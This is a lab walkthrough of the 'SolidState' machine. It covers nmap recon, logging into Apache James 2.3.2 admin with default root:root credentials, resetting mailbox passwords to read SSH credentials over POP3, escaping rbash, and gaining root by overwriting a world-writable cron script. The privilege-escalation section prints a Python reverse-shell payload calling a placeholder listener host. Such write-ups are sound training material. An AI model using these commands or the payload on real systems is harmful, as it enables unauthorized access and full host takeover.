# SolidState — Medium — Linux

**Date:** 4 August 2026

---

## Tags
`#linux` `#apache-james` `#default-creds` `#pop3` `#email` `#credential-leak` `#rbash-escape` `#cron` `#world-writable` `#privesc`

---

## What I Know

| Item       | Detail                                                          |
| ---------- | -------------------------------------------------------------- |
| Target     | solidstate.htb (10.129.44.232)                                |
| OS         | Linux (Debian 9)                                               |
| Open ports | 22, 25, 80, 110, 119, 4555                                     |
| Services   | OpenSSH 7.4p1; Apache 2.4.25; Apache James 2.3.2 (SMTP/POP3/admin) |
| Foothold   | James admin (4555, root:root) → reset mailbox pw → mindy's POP3 mail → SSH creds |
| Users      | mindy (rbash) → root                                           |
| Privesc    | World-writable root cron script /opt/tmp.py → reverse shell as root |

---

## Recon Notes

### Nmap Results

```
nmap --min-rate 3000 -T4 -p- 10.129.44.232

Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-04 21:58 +0100
Nmap scan report for 10.129.44.232
Host is up (0.052s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
110/tcp  open  pop3
119/tcp  open  nntp
4555/tcp open  rsip

Nmap done: 1 IP address (1 host up) scanned in 30.90 seconds
```

<img width="849" height="421" alt="image" src="https://github.com/user-attachments/assets/73ec205f-2f03-4028-b4b6-cecea98f0e05" />

```
nmap -sCV -p22,25,80,110,119,4555 10.129.44.232

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey:
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp   open  smtp?
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
110/tcp  open  pop3?
119/tcp  open  nntp?
4555/tcp open  rsip?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 398.47 seconds
```

> Nmap didn't fingerprint the mail ports, but 25/110/119/4555 together point to a mail stack
> and 4555 is the tell for the **Apache James** remote administration service.

<img width="1201" height="604" alt="image" src="https://github.com/user-attachments/assets/d6477f0b-d00c-40df-b865-54cc6aff0198" />

**What each port tells me:**
- **Port 22 (SSH)** — OpenSSH 7.4p1 on Debian. Open, but no creds yet.
- **Port 25 (SMTP)** — mail submission. Not useful alone without valid users.
- **Port 80 (HTTP)** — Apache 2.4.25, a company brochure site. Turns out to be a rabbit hole, the mail stack is the real target.
- **Port 110 (POP3)** — mailbox retrieval. Needs credentials, which becomes the key: once I have mailbox passwords, this is where the SSH creds are read.
- **Port 119 (NNTP)** — news transport (part of the James suite here); not a useful vector.
- **Port 4555 (Apache James Remote Administration)** — the standout. James 2.3.2's admin service listens here and famously ships with default creds.

---

## Enumeration Log

```
OBSERVATION: Port 22 is open
WHAT IT TELLS ME: We can SSH into the server
WHAT I AM GOING TO TRY: Keep it aside
WHY: I don't have credentials
RESULT: N/A
WHAT NEXT:
- Investigate the web app
- Directory-fuzz for hidden paths
- Check stack, source, JS
- Research the other ports for exploitation paths
```

```
OBSERVATION:
- The web app has little functionality; nothing in stack, source, Dir-fuzz or JS
- Port 25 needs valid users; port 110 needs user+password; port 119 (NNTP) isn't a useful vector
- Port 4555 is the Apache James Remote Administration Tool 2.3.2 (telnet shows the exact version and
  prompts for credentials)
WHAT IT TELLS ME: Port 4555 is the most promising, James 2.3.2 has known issues and a default cred
WHAT I AM GOING TO TRY: Research James 2.3.2 on 4555 for default creds / exploits
WHY: Default creds or a known exploit could leak data or give a foothold
RESULT:
- James 2.3.2 has a public RCE (Exploit-DB 35513 / "50347"): it creates a user whose name is a
  path-traversal string and mails a payload that fires when that user next logs in. I tried a
  GitHub version, but it only executes ONCE SOMEONE LOGS IN, so it just hangs waiting
- More usefully, the James admin default credentials are root:root
- Logged into the 4555 admin interface, ran listusers, and used setpassword to RESET every user's
  password to one I control
- Realised those same accounts are mailboxes reachable on POP3 (port 110 banners as "JAMES POP3
  Server 2.3.2"), so the reset passwords work there too
- Logged into each mailbox via POP3; only mindy's had mails, two messages, one containing SSH
  credentials for mindy
- (Because I'd also run the James RCE earlier, logging in as mindy triggered that payload and gave a
  shell too.) Read user.txt. Note: a normal SSH login as mindy drops into rbash, a restricted shell
WHAT NEXT: Enumerate (escaping rbash) for a privesc path
```

<img width="2555" height="1283" alt="image" src="https://github.com/user-attachments/assets/b1082305-6745-4853-bbd7-ecb70b2dc3ae" />

<img width="587" height="211" alt="image" src="https://github.com/user-attachments/assets/e9c30c86-a7cf-48a8-8255-9f9566e66688" />

<img width="2539" height="289" alt="image" src="https://github.com/user-attachments/assets/ceaf6856-d91d-4c11-b954-e9fda02b44ad" />

<img width="1499" height="271" alt="image" src="https://github.com/user-attachments/assets/ae4331bc-eec5-4f4b-89c2-1c17487761e0" />

<img width="1459" height="1174" alt="image" src="https://github.com/user-attachments/assets/8fe5a3b5-16ae-452f-9546-b0eb4e110e54" />

<img width="893" height="327" alt="image" src="https://github.com/user-attachments/assets/d7152f15-65ba-4cd1-8f1e-9714feacae4e" />

<img width="812" height="394" alt="image" src="https://github.com/user-attachments/assets/78fa91ea-1207-47dc-a797-4f82c3c9f5d2" />

<img width="1592" height="690" alt="image" src="https://github.com/user-attachments/assets/4fd31908-e822-4965-8a38-cca1f4a968fa" />

<img width="1467" height="478" alt="image" src="https://github.com/user-attachments/assets/fac45c3b-df65-496d-8105-38cd0c5ae98e" />

<img width="1467" height="478" alt="image" src="https://github.com/user-attachments/assets/4b21cfae-925a-484d-a975-565a309ede43" />

<img width="510" height="112" alt="image" src="https://github.com/user-attachments/assets/9ff41df5-060d-4a29-bac7-8fcf0082f388" />


```
OBSERVATION:
- linPEAS flags /opt/tmp.py, a Python script owned by root but WORLD-WRITABLE
- Reading it, the script just cleans out the /tmp folder
WHAT IT TELLS ME: A root-owned, world-writable script that "cleans /tmp" is almost certainly run on a
  schedule (cron) as root. If I overwrite it, my code runs as root
WHAT I AM GOING TO TRY: Replace /opt/tmp.py's contents with a Python reverse shell, start a listener,
  and wait for the cron to fire
WHY: A world-writable file executed by root on a timer is a direct root vector
RESULT: Within the cron interval I got a reverse shell as root and read root.txt
```

<img width="1267" height="418" alt="image" src="https://github.com/user-attachments/assets/bca6fa4d-3079-4d98-9efb-6372806b314c" />

<img width="731" height="186" alt="image" src="https://github.com/user-attachments/assets/29ca24eb-fa1c-44e8-a619-5478b9006b19" />

<img width="933" height="244" alt="image" src="https://github.com/user-attachments/assets/67e7150e-006a-485b-bff4-01b71cf615a6" />

<img width="2537" height="178" alt="image" src="https://github.com/user-attachments/assets/b80e5112-e612-450b-a1fa-a4690d86b085" />

<img width="1544" height="362" alt="image" src="https://github.com/user-attachments/assets/753c4ce8-6502-48fa-9cb6-9c14053eebec" />

---

## Foothold

**How I got in:** The web app was a decoy and the real target was the **Apache James 2.3.2** mail server. Its remote administration service on port **4555** accepts the default credentials **root:root**. Logged in, I listed the users and used the admin `setpassword` command to reset every mailbox password to one I chose. Because those accounts are also POP3 mailboxes (port 110), the reset passwords let me read their mail, **mindy**'s inbox contained a message with her **SSH credentials**. SSH'ing in gave the user flag (though into a restricted `rbash` shell).

**Command / exploit used:**
```
echo "10.129.44.232  solidstate.htb" | sudo tee -a /etc/hosts

# James admin — default creds
telnet 10.129.44.232 4555      # login: root / root
#   listusers
#   setpassword mindy <newpass>
#   setpassword <other users> <newpass>   (quit)

# read mindy's mail over POP3
telnet 10.129.44.232 110
#   USER mindy
#   PASS <newpass>
#   LIST / RETR 1 / RETR 2   → message contains mindy's SSH creds

ssh mindy@solidstate.htb       # → user.txt (lands in rbash)
```

**Why it worked:** Apache James 2.3.2 shipped with a well-known default administrator credential (`root:root`) that was never changed, and its admin interface lets you reset any mailbox password without knowing the old one. Since mail accounts double as POP3 logins, resetting a password is enough to read that user's mail and a plaintext SSH credential was sitting in mindy's inbox.

---

## Privilege Escalation

**Path taken (mindy → root):** The SSH login dropped into **rbash** (a restricted shell), so I first escaped it (e.g. `ssh mindy@... -t "bash --noprofile"`, or setting `PATH`/using an allowed binary's shell escape) to get a normal shell. Enumerating with **linPEAS**, the standout was **`/opt/tmp.py`**, a script **owned by root but world-writable**, whose job is to clean `/tmp`. That pattern screams "root cron job." I overwrote it with a Python reverse shell, started a listener, and waited and the scheduled root execution ran my code and returned a **root** shell. Read root.txt.

```
# escape rbash on login
 ssh mindy@solidstate.htb -t "bash --noprofile"

# overwrite the root-run, world-writable script
 cat > /opt/tmp.py 
 #!/usr/bin/env python
 import socket,subprocess,os
 s=socket.socket(); s.connect(("<LHOST>",<LPORT>))
 os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
 subprocess.call(["/bin/bash","-i"])
# wait for the cron interval → root shell on the listener
```

**Why it worked:** Two failures. First, mindy was confined to rbash, but restricted shells are routinely escapable (via an allowed program that can spawn a shell, or a login flag). Second, and the actual root cause: a **world-writable file owned by root** was executed on a schedule as root. Anyone who can write that file controls what root runs, so replacing its contents with a reverse shell is game over. Correct ownership/permissions (root-only write) would have prevented it.

---

## Post-Box Debrief

1. **Foothold technique in one sentence:** Logged into the Apache James admin service (port 4555) with default `root:root`, reset the mailbox passwords, read mindy's SSH credentials from her POP3 mailbox, and SSH'd in.
2. **Privesc technique in one sentence:** Escaped mindy's rbash, then overwrote a world-writable root-owned cron script (`/opt/tmp.py`) with a Python reverse shell to get root when the job ran.
